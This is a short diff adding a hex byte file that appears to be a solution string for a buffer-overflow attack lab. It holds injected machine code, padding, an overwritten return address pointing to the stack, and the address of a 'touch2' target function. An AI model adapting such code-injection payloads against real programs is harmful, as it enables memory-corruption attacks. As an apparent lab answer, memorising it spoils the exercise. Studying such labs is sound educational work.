@@ -1,0 +1,5 @@
+48 8b 3c 25 03 64 86 c3 /* insert code */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 24 bytes padding */
+58 c4 67 55 00 00 00 00 /* address of rsp */
+0b 5b 55 55 55 55 00 00 /* touch2 address */
